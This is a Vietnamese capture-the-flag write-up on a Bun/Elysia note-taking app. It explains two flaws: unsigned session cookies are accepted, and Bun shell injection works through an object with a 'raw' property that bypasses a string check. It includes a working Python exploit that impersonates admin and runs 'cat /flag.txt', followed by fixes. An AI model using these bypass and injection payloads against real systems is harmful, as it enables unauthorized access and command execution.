# Elysia's Bakery — BITSCTF writeup

**Thể loại:** Web | **Stack:** Bun + Elysia (TypeScript)

---

## Tổng quan

Ứng dụng ghi chú xây dựng trên Bun và framework Elysia. Có source code.
Flag nằm tại `/flag.txt` trên server, chỉ đọc được qua một endpoint dành riêng cho admin.

---

## Đọc source code

### Endpoint admin

```typescript
.post("/admin/list", async ({ cookie: { session }, body }) => {
  const data = getSessionData(session);
  if (!data) return status(401, "Unauthorized");
  if (!data.isAdmin) return status(403, "Forbidden");

  const folder = (body as any).folder;

  if (typeof folder === "string" && folder.includes("..")) {
    return status(400, "Invalid folder path");
  }
  const output = await $`ls ${folder}`.quiet().text();
  return { files: output.split("\n").filter(Boolean) };
})
```

Hai điểm đáng chú ý:

1. **Guard path traversal chỉ chạy khi `folder` là string.** Bất kỳ kiểu dữ liệu nào khác đều bỏ qua kiểm tra này.
2. **Lệnh shell nội suy `folder` trực tiếp.** Template literal `$` của Bun có hành vi đặc biệt: nếu giá trị nội suy là object có thuộc tính `raw`, nó được chèn thẳng vào lệnh shell **không qua escape hay quoting**.

### Xử lý session

```typescript
const app = new Elysia({
  cookie: {
    secrets: [Bun.env.SECRET_KEY || "super_secret_key"],
    sign: ["session"],           // ký khi ghi
  },
})
```

```typescript
function getSessionUser(session: any): string | null {
  if (!session.value) return null;
  return typeof session.value === "string" ? session.value : null;
}
```

`sign: ["session"]` chỉ bảo Elysia **ký cookie khi ghi** (khi đăng nhập).
Elysia không **từ chối** cookie không có chữ ký khi đọc — `session.value` được gán
thẳng từ giá trị client gửi lên. Gửi `Cookie: session=admin` không có chữ ký
vẫn được chấp nhận như một session admin hợp lệ.

---

## Lỗ hổng

### 1 — Cookie không được xác minh chữ ký khi đọc

Tùy chọn `sign` của Elysia chỉ thêm chữ ký vào `session.set()`. Không có guard nào
từ chối cookie thiếu chữ ký hợp lệ. Bất kỳ client nào cũng có thể tự nhận mình
là bất kỳ user nào bằng cách đặt `Cookie: session=<username>`.

### 2 — Bun shell `{raw}` injection (RCE)

Template literal `$` của Bun xử lý `{ raw: "…" }` như một shell fragment nguyên bản:

```js
$`ls ${{ raw: "; cat /flag.txt" }}`
// Thực thi: ls ; cat /flag.txt
```

Guard `typeof folder === "string"` không bao giờ được đánh giá với object, nên không có
gì ngăn cản kẻ tấn công thực thi lệnh tùy ý.

---

## Exploit

Hai dòng logic, ba dòng code:

```python
import requests

url = "http://localhost:3000"

req = requests.post(
    url + "/admin/list",
    cookies={"session": "admin"},                           # bypass xác thực
    json={"folder": {"raw": "; cat /flag.txt 2>/dev/null"}} # RCE
)

out = "\n".join(req.json().get("files", [])) + req.json().get("error", "")
print(out)
```

- `cookies={"session": "admin"}` — cookie không ký được chấp nhận như session admin.
- `"folder": {"raw": "…"}` — `typeof {…} === "object"`, guard bị bỏ qua; `{raw:"…"}` được chèn thẳng vào lệnh shell.

Output:
```
notes
public
src
...
BITSCTF{...}
```

---

## Nguyên nhân & cách sửa

| Lỗi | Cách sửa |
|-----|---------|
| Cookie không có chữ ký được chấp nhận | Từ chối cookie không qua được xác minh chữ ký; coi thiếu/sai chữ ký là chưa xác thực |
| `sign` của Elysia chỉ áp dụng khi ghi | Dùng `unsignCookie` thủ công trước khi tin `session.value`, hoặc nâng cấp Elysia lên version ép xác minh khi đọc |
| Input người dùng trong Bun shell template literal | Dùng `Bun.spawn(["ls", folder])` — argument array không bao giờ bị shell interpret |
| Guard `typeof` bị bỏ qua với non-string | Từ chối rõ ràng: `if (typeof folder !== "string") return status(400, …)` |
